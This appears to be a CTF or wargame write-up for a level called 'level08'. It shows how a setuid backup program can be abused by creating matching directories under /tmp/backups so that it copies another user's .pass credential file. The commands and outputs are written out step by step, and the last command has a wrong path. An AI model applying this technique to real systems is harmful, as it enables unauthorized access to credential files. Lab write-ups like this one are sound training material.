The program copies what's in argv[1] into the backups directory.
Since we cannot create anything ourselves into ~/backups let's try into /tmp .

$ cd /tmp ; mkdir backups

If we try with a single file, we notice that the copy works just fine.

$ echo "hello world" > hello && ~/level08 hello && ls -l backups
total 4
-rw-rw---- 1 level09 users 12 Feb 19 20:31 hello

If we try to copy a file from a directory like /bin/bash we get the following error

$ ~/level08 /bin/bash
ERROR: Failed to open ./backups//bin/bash

The important thing to notice here is the double '/'.
This simply means that the program didn't find the directory bin in backups.
If we create a directory called bin into backups and we try again, it works !

$ mkdir backups/bin && ~/level08 /bin/bash && ls -l backups/
total 0
drwxrwxr-x 2 level08 level08 60 Feb 19 20:24 bin

Let's now try with the .pass file we're looking for

$ mkdir -p backups/home/users/level09 && ~/level08 /home/users/level09/.pass && ls -la backups/home/users/level09/
total 4
drwxrwxr-x 2 level08 level08 60 Feb 19 20:34 .
drwxrwxr-x 3 level08 level08 60 Feb 19 20:33 ..
-rw-rw---- 1 level09 users   41 Feb 19 20:34 .pass

Here we go !

$ cat /backups/home/users/level09/.pass
